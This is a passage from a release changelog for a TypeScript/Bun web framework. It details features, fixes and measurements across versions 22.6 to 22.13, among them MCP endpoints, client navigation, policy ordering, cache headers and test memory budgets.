  `mcp` as a non-empty array of `defineAppMcp` values; endpoint #0 mounts at `ai.mcp.path` exactly
  as a single export does, every other at its own `defineAppMcp({ path })`, each with its own
  catalog, instructions, groups, scopes and `oauth`. Each endpoint serves its own RFC 9728
  path-inserted `/.well-known/oauth-protected-resource/<path>` document (its own `resource` and
  `scopes_supported`) and its 401 names that document; the root document stays endpoint #0's. Two
  endpoints on one route is `X_MCP_PATH_DUPLICATE`, thrown at boot. `x dev` prints one
  `mcp POST <path>` line per endpoint, and its `--json` gains `mcpPaths`; `AppMcpMount` gains
  `paths`. A single `mcp` export mounts byte-identically to before.
- **mcp:** `visibleTo` on `McpPrompt` — the tool/resource `McpVisibility`, fail-closed: a hidden
  prompt is absent from `prompts/list` and `prompts/get` answers it exactly as a missing one.

### Commits

- feat(mcp): several MCP endpoints per app, one per population; prompt visibleTo (#592)

## 22.13.0 - 2026-09-29

### Added

- **core, cli, testing:** `islands: { sharedChunks: true }` in `app.config.ts` — islands that share
  chunks, opt-in. Every `*.island.tsx` is then built in ONE `Bun.build` with `splitting: true`, so a
  module two islands import is one `/islands/chunk-<hash>.js` a page fetches once and a browser
  caches across pages, instead of a copy inside each island. Entries import their chunks by
  relative name and are served beside them under `/islands/` with the same `immutable` rule; a
  static export, the container's island store and the service-worker precache carry them (a
  precached page's entry brings its chunks). Chunk names are source identities like entry names —
  never Bun's output hash, which flaps under `minify` — and an entry's name moves when a chunk it
  imports does. Measured on a fixture of two islands sharing a 20 kB module: 41,926 → 21,996 B for
  the page with both; a page with one of them 21,837 → 21,894 B. OFF by default, because tree
  shaking across one split build keeps what any importer uses: on, `examples/dummy`'s plain-DOM
  update banner goes 712 → 16,288 B and three of its routes exceed their budgets; notificado.co's
  `/afiliados` goes 55,585 → 42,331 B with both uploads and 33,958 → 39,931 B with one. Module state
  in a shared chunk is one instance per page. `IslandBundle` gains `shared` and `assetAt(url)`,
  `IslandChunk` gains `imports`, `buildIslands` takes `sharedChunks`, and `mountIsland` writes a
  builder's `shared` chunks beside the entry.

### Changed

- **cli:** a route's `budget.js` is the unique set of files its islands load: `measureDocumentJs`
  follows an island entry into every chunk it imports (static and `import()`), each file counted
  once per document. Unchanged for a self-contained island; `BUILD_STATS_RULES` is 3, so rebuild
  with `x build --target static` before `x verify`.

### Fixed

- **cli:** a supervised `x dev` child no longer outlives what it serves. It watches its supervisor
  (the pid the supervisor now hands it in `ULTIMATE_DEV_SUPERVISOR_PID`) and its app root once a
  second: a supervisor that died without stopping it — a SIGKILL cannot be forwarded — makes it
  drain and exit (`dev.supervisor.gone` on stderr), and a deleted or moved root makes it exit 1
  with the new `X_DEV_ROOT_GONE`, which the supervisor answers by stopping rather than respawning.
  Found as two children of `cmd-dev-restart.live.test.ts`, six hours old, ppid 1, cwd deleted, one
  at 7 GB: with its root gone the jobs worker, outbox relay and scheduler poll an embedded database
  with no directory. Every stop the child begins (SIGINT, SIGTERM, the watch, a restart) now also
  carries a hard exit past the drain deadline plus the release floor (35 s by default), so a stop
  that hangs still ends. The supervisor SIGTERMs a running child on every other way it exits (an
  uncaught error, `process.exit`).
- **cli (tests):** the `x dev` live tests (`cmd-dev.live`, `cmd-dev-restart.live`, the new
  `cmd-dev-orphan.live`) reap the supervisor and every process it started on every path — an
  `afterEach` reaps by fixture cwd too, because bun abandons a timed-out test without its `finally`
  — and assert no process is left in the fixture directory or on its port. `cmd-dev.live` takes its
  own metrics port, so a developer's running `x dev` on 9090 no longer fails it.
- **db, cli:** `x verify`'s hand-written-SQL rail (`X_MIGRATION_UNGENERATABLE`) no longer counts
  the in-place column moves `x db gen` writes itself — `alter column … set default` / `drop default`
  and `set not null` / `drop not null`. They were missing from `GENERATABLE_FORMS`, so a generated
  migration that moved a default or dropped a NOT NULL was refused until it carried a
  `-- ungeneratable:` header. The backfill an author writes for the `-- backfill …, then: … set not
  null;` note is still counted (the `update`); its `set not null` is not. A header that now
  over-counts is not a finding.

### Commits

- fix: x db gen column moves counted, x dev orphaned workers exit; feat: opt-in shared island chunks (#587)

## 22.12.0 - 2026-09-29

### Added

- **query:** the page envelope — `query.page()` and `GET /_x/query/<name>?_first=…` — also answers
  `nextCursor` (the value of `endCursor`) and `hasMore` (the value of `hasNextPage`). They are the
  preferred names; the old two stay, always equal, documented as aliases and not deprecated.
  `openapi.json`'s envelope schema lists all five as required, each alias described as one, and
  `_after` is documented as taking `nextCursor`. `Page<T>` gains both fields (built by one
  constructor, so the pairs cannot disagree). A client reading `endCursor`/`hasNextPage` is
  unaffected.
- **action, cli:** a bearer mount's document (`http.mounts[].openapi`, e.g. `openapi.v1.json`)
  secures each operation with the scope that names it — `security: [{ bearer: ['cases:read'] }]`
  instead of `bearer: []` — and `components.securitySchemes.bearer` documents the scope map: every
  scope with the operations it unlocks, in its `description` and as `x-ultimate.scopes`
  (`{ '<scope>': ['<operation>', …] }`, both sorted). `x-ultimate.scope` per operation is unchanged.
  The complete `openapi.json` is unchanged. Regenerate with `x manifest --openapi`; `x verify`
  reports the old document as stale.
- **cli:** `X_DEV_RESTART_REQUIRED` — a save in an unsupervised dev process (`startDev()` with no
  `onRestart`) reached a module that defines a primitive; reported on `/_x`.

### Fixed

- **cli:** `x dev` served stale code after a save that reached a module defining a primitive — a
  slice's `service.ts` imported by its query, an admin page's `ui-*.tsx` under `defineAdmin`, or
  the action/query/entity/job file itself. That module is never re-imported (its registry refuses
  a second definition, and the route table holds its first instance), so it kept the old code while
  `x dev` logged `reloaded`. The reload graph now records every pinned module a save reaches
  (`takeStalePins`), and `x dev` runs as a supervisor plus a serving child: on such a save the child
  prints `restarting: <file> under <module> — …` on stderr, drains, releases the port, the lock and
  the embedded database, and exits `75`; the supervisor boots a fresh child on the same port
  (`--port 0` is pinned to one free port first). Saves that reach no pinned module keep the
  in-process reload (unchanged speed). SIGINT/SIGTERM to the supervisor are forwarded and never
  answered with a respawn. `--once` is unsupervised; `startDev({ onRestart })` receives the pins
  instead of `onReload`.

### Commits

- feat: page envelope nextCursor/hasMore aliases; per-operation bearer scopes in mount OpenAPI; x dev restarts when a save reaches a pinned primitive module (#585)

## 22.11.0 - 2026-09-29

### Changed

- **policy, action, query, mcp:** the policy's ACTOR half is decided before the input is parsed.
  A caller the policy refuses whatever they send — no session, or a `can(p)` they lack — gets
  `X_UNAUTHENTICATED`/`X_FORBIDDEN`, never `X_INPUT_INVALID` with an issue list describing the
  input schema of an operation they may not call (a staff action's shape, told to any customer
  who sent `{}`). Over HTTP, MCP (the `invalid-args` answer too), jobs and `.as()`/in-process
  calls, for actions, queries (`runQuery`, `sourceFor`, live) and `defineAppMcp` app tools. A
  caller WITH the permission and a bad input still gets `X_INPUT_INVALID` with the path; a
  predicate over `input` or `row` still runs after the parse, on the parsed value. Exact, not a
  heuristic: only clauses that read no input decide early (`can(p)` without a predicate,
  `allow()`, `deny()`, their `and`/`or`/`not`, and `can(p, pred)` for an actor without `p`); a
  hand-built `Policy` object is always left to the full evaluation. An audited action's denied
  attempt still records the parsed input.
- **action:** the generated contract assertion "input schema rejects garbage" asks the action's
  own input parser instead of `invoke` — with the actor half first, an anonymous `invoke` of a
  guarded action is refused 401 before the schema sees the garbage.
- **cli:** `x shot` hides scrollbars (`Emulation.setScrollbarsHidden`), so a page is laid out at
  exactly the declared width — `--matrix` captures were 1425 and 375 px wide, not 1440 and 390 — and
  a full-page capture is never narrower than its viewport.
- **cli:** `x shot --island` crops to the union of the island's box and every open popup in the
  harness (`[role=listbox|menu|dialog|alertdialog|tooltip]`, `dialog[open]`, `:popover-open`), so
  an `open` state photographs its listbox or menu instead of cutting it at the trigger.

### Added

- **policy:** `decideBeforeInput(policy, { actor, ctx })` and `enforceBeforeInput(surface, policy,
  { actor, ctx })`, type `PreInputArgs`. **action, query:** `guardBeforeInput(policy, subject,
  surface)` — the gate `invoke`/`sourceFor` open with. **mcp:** `McpTool.admit(caller)` and
  `ProjectablePrimitive.admit(actor)`, asked before `invalid-args`; `ToolResolution`'s
  `invalid-args` carries its `tool`.
- **cli:** `x shot --cookie name=value[,name=value]` — cookies set for the app's origin before the
  first navigation, on a route shot, every `--matrix` cell and every `--island` state
  (`ShotSessionInit.cookies`).
- **docs:** a route or admin mount answering 403/404 while rendering its own page is
  `withStatus(status, data)` from `@ultimat3/render` (shipped earlier); the admin README shows the
  `load` for a refused `guardedPage()`.

### Fixed

- **core:** a `beginWork()` finisher from before `resetLifecycle()` no longer counts down the next
  lifetime. It drove the fresh in-flight count to -1, the drain's in-flight wait (idle only at
  exactly 0) then waited its whole 25 s budget, and `packages/jobs`' "nothing is claimed or
  published once the drain has resolved" timed out on CI.
- **examples/dummy:** `orgs/repo.test.ts` counts ids in its own block — sharing `posts/repo.test.ts`'s
  put that file's member in this file's first org whenever the two landed on one worker.

### Commits

- fix(policy): decide the actor-only part of a policy before parsing input (403, not a 400 that lists the schema); x shot exact widths, --cookie, popups in island crops; lifecycle generations fix the jobs drain race (#583)

## 22.10.0 - 2026-09-29

### Added

- **mcp:** `initialize` answers `instructions` when the app declares them —
  `defineAppMcp({ instructions })` / `createMcpServer({ instructions })`, a string or
  `(caller) => string | undefined` for per-population advice (staff vs customer). A function that
  throws or answers blank sends none and the handshake still answers. New type: `McpInstructions`.
- **mcp, action, query:** tool metadata per MCP 2025-06-18. `tools/list` publishes `title`
  (`mcp: { title }`) and `annotations`, derived from the primitive — a query
  `{ readOnlyHint: true }`, an action `{ readOnlyHint: false, destructiveHint: true,
  idempotentHint: <idempotent> }` — and overridden key by key by `mcp: { annotations }` on the
  action or query (`openWorldHint` is published only when declared). Hand-written app tools take
  `title` and `annotations` too; `list_resources` and `describe_resource` are read-only,
  `manage_resource` a write. New exports: `McpToolAnnotations`, `deriveAnnotations`,
  `toolListEntry` (mcp), `McpAnnotationHints` (action), `QueryMcpAnnotations` (query).
- **mcp:** `outputSchema` and `structuredContent`. An action whose `output` has an object root
  publishes it as `outputSchema`; a query that declares `rows` publishes `{ rows: [<row>] }`. The
  schema is structure only (type, properties, required, items, enum, const, anyOf) — a client
  refuses a result that misses its schema, so no bound, pattern or `additionalProperties` is
  promised about a value the server produced. Every successful call of such a tool answers
  `structuredContent` (the serialized answer read back, a query's under `rows`) beside the text
  block; `manage_resource` answers it byte for byte. New exports: `structuredResult`,
  `toOutputSchema`, `toRowsOutputSchema`.
- **mcp:** `measureMcpSurface(server, caller)` — the characters of `tools/list`, `list_resources`
  and `instructions` one caller reads, off the wire — and `assertMcpSurfaceBudget(server, caller,
  { toolsList, listResources, instructions })`, which throws the new `X_MCP_SURFACE_OVER_BUDGET`
  (`McpSurfaceOverBudgetError`) naming every surface over its ceiling. `McpServer.catalog(caller)`
  answers the meta catalog as data (`MetaResource[]`) for a test.
- **core, action, query, policy, auth, http, mcp:** `callerFix` — the fix for a REMOTE caller when
  `fix` names something only the app's developer can run. `UltimateErrorInit.callerFix`,
  `UltimateError.callerFix`, `format({ audience: 'caller' | 'developer' })`, `fixFor(error,
  audience)`, type `ErrorAudience`. The framework's denials declare one — `X_FORBIDDEN` from
  policy, action, query, auth and http ("ask the account owner or an administrator to grant …;
  retrying is refused the same way"), `X_MCP_SCOPE_DENIED` ("ask for a token that includes the
  scope, then reconnect"), `X_INPUT_INVALID` ("correct the fields against the published schema").
  `defineAppMcp` renders it by default (`errorAudience: 'caller'`; `'developer'` restores `fix`);
  `createMcpServer` — the dev server — keeps `'developer'`. A production problem document carries
  `callerFix` as its `fix`; dev mode, the terminal, the log line and `--json` keep the developer's.
- **mcp:** an error's `docs`, when it is not the framework's one Error-Codes page — an app's
  `docs://recipes/...` guide on its own `UltimateError` — renders as a fourth `docs:` line of the
  tool result (and a resource-read refusal's `data.docs`). Branded errors only. Over HTTP it was
  already the problem document's `docs`.
- **core, cli, seo:** `seo.sitemap` in `app.config.ts`. `extra: ['/verificar', '/estado']` lists
  public pages outside `site/` — each must be answered by an `app/` route with no `policy`, and is
  listed per routed locale with the hreflang cluster and `x-default` a `site/` page gets; a path no
  ungated `app/` route answers (or an `api/` route, a gated page, a `site/` page) is the new
  `X_SITEMAP_EXTRA_INVALID` when the sitemap is built. `lastmod: 'none' | 'git' | 'mtime' | 'build'`
  fills `<lastmod>` per URL — the route file's last commit (its mtime without a work tree), its
  mtime, or one timestamp — read once per file per process; default `'none'`, as before.
  `siteSeo({ sitemap, root })` takes both; the web role passes them, and the scaffolded
  `prerender.ts` reads them from `loadSiteSettings(root)` — an app with its own `prerender.ts` adds
  `sitemap: settings.sitemap, root`. New: `SeoSitemapConfig`, `SitemapLastmod`,
  `SITEMAP_LASTMOD_SOURCES` (core), `RouteRecord.sitemap` (seo), `SitemapExtraInvalidError` (cli).

### Changed

- **mcp:** invalid tool arguments are a tool **result** — `isError: true`, `X_INPUT_INVALID`, each
  issue addressed by path, the code HTTP answers for the same input — not a JSON-RPC `-32602`.
  Clients surface a protocol error to the human and hide it from the model, which then retried
  blind. `-32602` remains for a call that is not one (no `params`, a non-string `name`) and
  `-32601` for an unknown tool or method. The audit outcome is still `invalid-args`.
  `X_MCP_ARGS_INVALID` is no longer raised on the wire; `McpArgsInvalidError` stays exported.
  `InputInvalidError` takes an optional fourth argument, `'action' | 'tool'`, naming the subject in
  its cause.
- **mcp:** a tool's text block is compact JSON (`jsonResult`), not 2-space — every byte of a result
  stays in the caller's context for the session. `list_resources` answers plain text, one line per
  resource and one per action (`  publishPost (action; confirms; scope posts:write) {postId:
  string} — Publish a draft post`); a staff catalog measured 32.5k characters as JSON. A consumer
  that `JSON.parse`d either reads `structuredContent`, `server.catalog(caller)` or the text.
  `describe_resource` stays JSON. New export: `renderCatalog`.
- **http:** `Vary: accept-language` is sent only when the header can decide the locale. An app
  whose `configureLocales({ order })` leaves `'header'` out no longer varies on it — every SSR
  and ISR page added it whatever the order, so a CDN stored one copy per browser language of a
  page that could not differ by it. A path-locale route already dropped it.

### Commits

- feat(mcp): instructions, tool annotations + outputSchema, isError argument results, compact catalog + surface budget, caller-facing fixes; sitemap extra + lastmod; Vary only when read (#581)

## 22.9.1 - 2026-09-29

### Fixed

- **schema:** every browser bundle holding a typed client shed ~1 kB (`examples/dummy` `/pricing`
  22,639 -> 21,594 B). `SCHEMA_ERROR_CODES` moved to a data-only leaf, `src/error-codes.ts`: declared
  beside `SchemaError`, core's load-time registration of it kept the class and its subclasses in
  every island, because a class with a computed member is never tree-shaken. Exports unchanged.
- **release:** 22.9.0 did not reach the registry for `@ultimat3/money` and `@ultimat3/jobs` — a first, failed run left both versions *staged* on npm, and npm refuses to publish over a staged version (409). 22.9.1 is 22.9.0 re-published under a fresh version for every package; no code change.

### Commits

- release: 22.9.1

## 22.9.0 - 2026-09-29

### Added

- **query:** `single: true` on a query declaration — a read of one object. Only the wire changes:
  `GET /_x/query/<name>` answers the first row `sql` returns as the body and **404 `X_NOT_FOUND`**
  when it returns none (a list read answers `200 []`), and refuses `_first`/`_after` with 400
  `X_INPUT_INVALID`; `openapi.json` documents one object, a `404`, no page controls and
  `x-ultimate.single: true`. `.client()` and `queryClient` type it `Promise<TRow>` with no `.page`.
  Every in-process caller — `read(input)`, `.as()`, `.page()`, `.live()`, the MCP tool — keeps
  `readonly TRow[]`, so opting in breaks no `[0]` already written. New exports:
  `QuerySingleClientMethod`, `QueryClientMethodOf`, `QueryRowNotFoundError` (`X_NOT_FOUND`,
  entity's code), `QuerySingleInvalidError` (`X_QUERY_SINGLE_INVALID`, a non-boolean `single:`).
  `Query` gains a third type parameter, `TSingle`, defaulting to `false`.

### Fixed

- **schema, entity:** a string carrying U+0000 reached Postgres, which refuses it in `text` and
  `jsonb` (SQLSTATE 22021), so any action or query storing or filtering on user text answered
  `X_DB_STATEMENT_FAILED` — a 500 — for one `%00`. Every string-backed `t` (`string`, `uuid`,
  `email`, `url`, `timezone`, `locale`, `slug`, `cursor`) and every `t.record` key now refuses it:
  a 400 `X_INPUT_INVALID` naming the field, never the value, on actions, query search strings and
  every other surface that parses through `t`. `text()` and `url()` columns refuse it too
  (`X_INVARIANT_VIOLATED`, `column.format`), so the memory driver no longer stores what production
  refuses. Only NUL: tabs, newlines and the other C0 controls are legal text Postgres stores.
- **jobs, testing:** `resetTasks()` and `resetJobs()` rewound the counter behind
  `anonymous-task-<n>` / `anonymous-job-<n>`, so after a reset the next anonymous task re-minted a
  name an earlier test file's handle still held. With `@ultimat3/testing` restoring registries
  between files (22.7's shared workers), the name-keyed snapshot merge dropped one of the two, or
  `task()` refused its own fresh name as `X_JOB_DUPLICATE` — order-dependent failures in whichever
  file ran next. The counters are now process-monotonic; a reset clears the registry only.

### Commits

- fix: refuse U+0000 in t.string and text()/url() columns; never reuse anonymous task names; query single: true answers 404 (#578)
- docs(plans): 101 — audit sweep: bugs, gaps, drift (#577)

## 22.8.2 - 2026-09-28

### Fixed

- **http, cli:** `x-ultimate-location` — the hand-back the client router follows — named the public
  site with the INTERNAL request's scheme. Behind a TLS-terminating proxy the process sees
  `http://…`, so a soft visit to a `navigation: 'document'` page, a non-page route or another
  principal's page answered `x-ultimate-location: http://www.example.com/…` (HSTS hid it in
  browsers). A same-origin target is now its path, query and fragment only — for that hand-back and
  for a same-origin redirect rewritten for the router — and the router resolves it against the page
  it runs in; a cross-origin target is kept exactly as the app's `Location` gave it. New export:
  `locationFor(target, base)` (http).

### Commits

- fix(http,cli): x-ultimate-location is a path for same-origin targets (#575)

## 22.8.1 - 2026-09-28

### Fixed

- **cli:** a `navigation: 'document'` page no longer carries the client router. Every page of a
  `navigation.client` surface was named the router script and its `ultimate-navigation` /
  `x-ultimate-build` metas, so a 0 kB document page — a recipient's evidence page, a magic link, an
  unsubscribe, a payment return (`budget.js: '0b'`, `hydrate: 'never'`) — shipped 17.8 kB and failed
  `X_BUDGET_EXCEEDED`. Now such a page names none of the three and is charged none of the router's
  bytes (the budgets step weighs the emitted document). Behaviour is unchanged where it matters: a
  link TO it was already a full load; its own links and forms are now the browser's, which is what a
  document page means; the next soft page it links to boots the router again.
- **render:** a click in the first ~250 ms after a soft navigation was lost. While the view
  transition animates, Chrome hit-tests every press to `<html>`; the release lands on the real
  element, so the click — aimed at their common ancestor — reached nothing (no soft navigation, no
  full load). A press during a transition now skips it (`skipTransition()`), and a click aimed at
  `<html>` by such a press is given to the element under the pointer (`elementFromPoint`) — a link,
  a submit button or an island's control alike. With `prefers-reduced-motion: reduce` there was no
  transition and no loss, which is how it was found.
- **render:** a fast click sent two requests for the page: the soft GET, then the prefetch the
  pointer's arrival had scheduled 65 ms earlier (and the focus the press gave the link scheduled
  another). A press or click now cancels the pending prefetch, a focus that comes from a press is
  not an intent, and no prefetch starts for the page a navigation is already fetching. The router is
  19,071 B (7,065 B gzip), +795 B.

### Added

- **testing:** `E2eTab.pointerClick(selector)` — a click the BROWSER hit-tests (pointer moved,
  pressed and released at the element's centre through `Input.dispatchMouseEvent`), so an overlay
  painted over the element receives it, as it would a person's. `click()` dispatches at the element
  and cannot see that.

### Commits

- fix(cli): a navigation: 'document' page ships no router (#573)

## 22.8.0 - 2026-09-28

### Added

- **render, cli, core, http:** client navigation — soft navigation over server-rendered documents,
  opted in per surface with `navigation: { client: ['app'] }` in `app.config.ts`, and per page with `defineRoute`'s twelfth key,
  `navigation: 'prefetch' | 'document'` (`X_ROUTE_NAVIGATION_INVALID` for any other value or off a
  `navigation.client` surface). A same-surface link or form fetches the next page its route renders
  anyway and swaps it into the tab: stylesheets loaded first, old islands disposed, persisted
  elements (`data-x-persist`) carried with their attributes and `aria-current` re-synced, server
  head tags diffed (JSON-LD replaced, script-added tags kept, the old page's stylesheets retired, the
  new page's head scripts run once), new islands booted by the same inline hydration runtime, inside
  `startViewTransition` unless `prefers-reduced-motion`. History with each entry's document,
  scroll saved as it happens (back and forward), focus to `<main>`, an `aria-live` announcement,
  `data-x-navigating` past 150 ms, an in-flight navigation aborted by the next.
  **Nothing is sent twice**: `@ultimat3/http` answers a router request before auth or app code —
  a prefetch of any route that did not declare `'prefetch'` with `204`, a soft GET to anything but a
  page of the router's `<app>:<surface>` (and a page for another principal) with `204` +
  `x-ultimate-location` — and turns any 3xx answered to the router into the same hand-over, cookies
  kept. The router fetches with `redirect: 'manual'`, never re-submits a POST
  (`ultimate:navigation-error`, cancelable), and hands a non-page answer to the browser from the bytes
  it received. Prefetch cache (per tab, memory, 30 s, 20 entries) never answers with a non-2xx or a
  hand-over, keeps a `no-store` page 5 s, and is emptied by POSTs, `onClientWrite` (new in core,
  announced by `clientTransport` after every write settles), `onRescope` and a `BroadcastChannel`
  across tabs. The router is `@ultimat3/render/navigation`, built by the CLI to
  `/_x/navigation/<hash>.js` (18,276 B, 6,852 B gzip), served `immutable`, written by the static
  export, precached by the service worker, charged to each opted-in route's `budget.js`. New exports:
  `linkVerdict`, `formVerdict`, `responseVerdict`, `reusable`, `mayPrefetch`, `navigationCache`,
  `clientNavigationTags`, `ROUTE_NAVIGATION_MODES`, `RouteNavigationInvalidError`, the
  `NAVIGATION_*`/`NAVIGATE*_EVENT` names (render); `navigationGate`, `redirectForRouter`, `relocate`,
  `navigationPurpose`, `RouteMeta.navigation` (http); `onClientWrite`, `notifyClientWrite`,
  `CLIENT_NAVIGATION_*` headers, `NAVIGATION_SURFACES`, `NavigationConfig` (core).
  [Client navigation](https://github.com/developerz-ai/ultimate/wiki/Client-Navigation).
  **What an app that does not opt in pays** (default `navigation.client: []`): no router script, no
  head tag, no route; +40 B in the inline hydration runtime of every page with an island (below);
  +207 B in an island that reaches `clientTransport` (the write announcement, below); and one header
  check per request in `@ultimat3/http`'s gate, inert unless a request carries
  `x-ultimate-navigation` — which only the router sends.
- **testing:** `E2eTab.scripting(enabled)` — `Emulation.setScriptExecutionDisabled` for one tab, so
  an e2e can prove a page works with no JavaScript.

### Changed

- **render:** the inline hydration runtime visits each island root once per tab (`el.__v`), so it can
  run again over a swapped-in body without booting a carried island twice: +40 B per runtime
  (`idle` 1,784, `interaction` 1,669, `visible` 886). `DEFAULT_ISLAND_JS_BYTES` still clears the
  worst case (19,581) with 899 B of headroom.
- **core:** `clientTransport` announces every write through `onClientWrite` once it settles (+207 B
  in an island that reaches the transport).
- **examples/dummy:** the `app/` surface opts into client navigation, `/feed` and `/settings` into
  prefetch; `/posts/new` (`20.5kb`), `/settings` (`57.5kb`), `/posts/:id` (`152.5kb`) and `/pricing`
  (`22kb`) budgets raised by the measured bytes.

### Commits

- feat(render,http,core,cli): client-side navigation — soft navigation over server-rendered documents (#570)

## 22.7.1 - 2026-09-28

### Fixed

- **http:** a shared cache is never offered an exchange it cannot replay. The `cache-headers` stage
  now answers `cache-control: no-store` + `pragma: no-cache` for any non-`GET`/`HEAD` request and any
  `4xx`/`5xx`, before the route default, a declared `meta.cache`/`ctx.cache` hint, or a handler's own
  shared offer (`public`/`s-maxage`) is applied; a handler's `private` or `no-store` is left as
  written. Before, an anonymous `POST /mcp` refused `401` + `WWW-Authenticate` went out
  `public, max-age=0, s-maxage=60, stale-while-revalidate=600`, and an app's `POST /oauth/token` error
  (RFC 6749 §5.1) carried the same. New export: `replayableExchange(method, status)`.
- **mcp:** the 401 challenge on an `oauth` route carries `scope="…"` — the supported scopes
  (`oauth.scopesSupported`, else the `defineAppMcp({ scopes })` names), sorted and space-separated —
  per the MCP authorization spec (2025-06-18 / 2025-11-25) and RFC 6750 §3, after `error="invalid_token"`
  (only when a token was sent) and `resource_metadata`. A scope that is not an RFC 6749 scope-token
  (space, quote, backslash, empty) is refused at construction (`X_MCP_OAUTH_INVALID`). Every answer
  `mcpHttpRoute` gives — 401, 403, 413, 429, 400, 200, 202 — is `cache-control: no-store`, so
  `x mcp serve` (no pipeline) says it too. The in-band `X_MCP_SCOPE_DENIED` stays a JSON-RPC error
  on a 200; there is no HTTP 403 `insufficient_scope` path to annotate.
- **schema:** the `TZ=UTC` / `TZ=America/New_York` parity test spawns its two `bun -e` children
  concurrently, names a child's stderr when it crashes, and states a 60 s budget — it timed out at
  bun's 5 s default on a loaded runner (release PR #567).
- **cli:** "fifty saves do not grow the process" measures the live JS heap after two full
  collections instead of RSS (which the allocator keeps high under load with nothing retained), and
  its line tightens from 120 MB to 40 MB — five retained 8 MB generations now fail it.

### Commits

- fix(http,mcp): auth failures / POST answers never shared-cacheable; 401 names scope; two load flakes (#568)

## 22.7.0 - 2026-09-28

### Changed

- **cli:** the default test width is a memory BUDGET — `min(4 GiB, max(2.75 GiB, 25% of total RAM))` at 1.25 GiB
  a worker (2 on an 8 GB box, 3 from 16 GB), clamped to `1..cores` — instead of `ceil(cpus x 1.5)` held to 60% of `freemem()` (which
  counts page cache). The step line prints it: `3 workers (budget 4.0 GB)`.
  `ULTIMATE_TEST_MEMORY_BUDGET` (e.g. `3g`) and `ULTIMATE_TEST_MAX_WORKERS` override it
  (`X_TEST_BUDGET_INVALID` on a value that does not parse); `--workers` still wins, and now accepts
  1. Each batch leases its workers from a machine-wide pool of lock files, so concurrent gates share
  one budget (`ULTIMATE_TEST_SLOTS=0` turns it off). Without isolation a pass is ONE long-lived
  `bun test` per run (recycled past 256 files a worker; 24 under `--isolate`), and every parallel run
  reads and refreshes `.x/test-timings.json` so Bun starts the slowest files first.
- **cli, testing:** test files are no longer isolated by default: `bun test --parallel=N
  --no-isolate`. `--isolate` on `x test`/`x verify`, or `"isolate": true` in `x.verify.json`, opts
  back in. Between files of a worker the testing preload disposes undisposed island mounts,
  restores `globalThis` and `process.env`, restores the permission/role/catalog registries as a
  union and the task registry exactly, forgets action paths an earlier file derived, and (in an
  app) installs the render JSX loader up front. notificado.co `x test unit`, 768 files: 22.6.2's
  default 14 workers, 193 s, 13.1 GB peak → 3 workers, 134 s, 3.6 GB (89.8 s, 3.7 GB once its
  test database uses `reusableDatabase`); the framework's own
  unit tier 115-125 s at 2.9-3.0 GB.

### Added

- **cli:** `x verify --only unit|contract|job --shard i/n [--timings file]` runs one CI job's
  deterministic slice (round-robin over the sorted list, or greedy longest-first from Bun timings),
  carrying `data.shard` and `steps[].shard` (`corpusHash`, `files`); the zero-tests floor is
  deferred to `x verify merge <part.json…>`, which folds every part into the gate verdict and names
  any gap (`X_VERIFY_SHARD_INVALID`, `X_VERIFY_MERGE_INCOMPLETE`, `X_VERIFY_MERGE_INPUT`). Guide:
  [CI: the gate across parallel jobs](https://github.com/developerz-ai/ultimate/wiki/CI-Parallel-Gate).
- **cli:** `x build --no-preflight` skips the six static steps a following `x verify` runs anyway;
  the scaffolded `bin/check` uses it.
- **testing:** `reusableDatabase(open)` — one embedded database per worker, its data reset to the
  template between files (a PGlite boot from a template is 2.4-7 s a file). notificado.co unit with
  it: 3 workers, 89.8 s, 3.7 GB (134 s without it).
- **jobs:** `restoreTasks`. **i18n:** `catalogDeclarationCount`. **action:**
  `forgetHandedOutActionPaths`.

### Fixed

- **cli:** `x dev` serves an edited COMPONENT, not only an edited page. A reload re-imported only
  the changed route module (`?x-reload=<hash>`), and every module it imports resolved to the
  instance already in Bun's cache, so a save to a component, a helper, a `.module.scss` or a Sass
  partial logged `reloaded` and rendered the old code until a restart (notificado.co: the panel's
  balance card and the home page). A reload now hashes every loaded file and evicts each changed one
  and everything importing it from Bun's module registry (`app-reload-graph.ts`), so the scan
  evaluates the new chain; a module that defines a primitive (entity, action, query, mutator, job,
  task, the API index) is pinned and still needs a restart. Evicting instead of a query per save
  keeps the process flat: 50 saves of a component holding 8 MB add no retained generations.
- **cli:** `x dev` empties its `isr` store on every reload — an `isr` page's first render answered
  for its whole ttl after every save.

### Added

- **render:** `asset('assets/…')` in Sass. `src: url(asset('assets/fonts/inter.woff2'))` compiles to
  the content-hashed URL `/assets/*` serves, in `x dev`, the container and the static build; a
  missing file is `X_ASSET_MISSING` at compile time. The Sass disk cache re-checks each asset a
  cached sheet named (entry format v2), and `CompiledStylesheet.dependencies` /
  `Stylesheet.dependencies` name the partials a sheet read.
- **seo:** `RouteMeta.links` — typed `<link>` tags in `<head>` (`rel`, `href`, `as`, `type`,
  `crossorigin`, `media`) for SSR and prerender. An href that is not a path or an `http(s)` URL, a
  preload with no `as` and a font preload with no `crossorigin` are `X_SEO_LINK_INVALID`, thrown at
  render and reported at the route file by the `seo` step. **render:** a link's `href` is part of its
  head-dedupe identity (except `canonical` and hreflang alternates), so two preloads are two tags.

- **action:** `toRoute` honours an unseated action's own pinned `http.path` instead of the style's
  derived one.
- **db:** a PGlite client's `close()` runs a full GC, so its WASM heap is returned before the next
  test file boots its own.

### Commits

- feat: lean gate — memory-budgeted width, machine-wide slots, no-isolate default, CI shards + verify merge, build --no-preflight (#566)
- fix(cli): x dev reloads imported modules; feat: Sass asset(), RouteMeta.links (#565)

## 22.6.2 - 2026-09-27

### Fixed

- **cli:** `x test` and `x verify`'s parallel test steps have a bounded peak memory that no longer
  grows with the corpus. A `--parallel` worker's heap grows with every file it runs and is returned
  only when its `bun test` exits, so one process over the whole selection peaked higher with every
  test an app added; 22.6.1's default (18 workers on a 12-core box with 35 GB free) took a 45 GB
  machine with no swap down. A pass now runs as sequential batches of at most 24 files a worker
  (`test-batches.ts`), dealt round-robin over the sorted list, and the default width is held to 60%
  of available memory at 1.5 GiB a worker — the largest single worker measured — instead of all of
  it at 1 GiB. notificado.co's `x test unit` (768 files): 17.1–18.2 GB peak at the old default,
  11.3–12.2 GB at the new one (14 workers, 3 batches), the same wall within noise (152–163s against
  132–167s). Counts, failures and the `fix:` reproduction hold across batches; `--json` carries
  `batches` when a pass was split, and `--worker I` reruns are never split.

### Commits

- fix(cli): bound test-run peak memory — sequential batches, honest per-worker budget (#563)

## 22.6.1 - 2026-09-27

### Fixed

- **cli:** the module scan evaluates `apps/web/api/index.ts` FIRST, before every other app module.
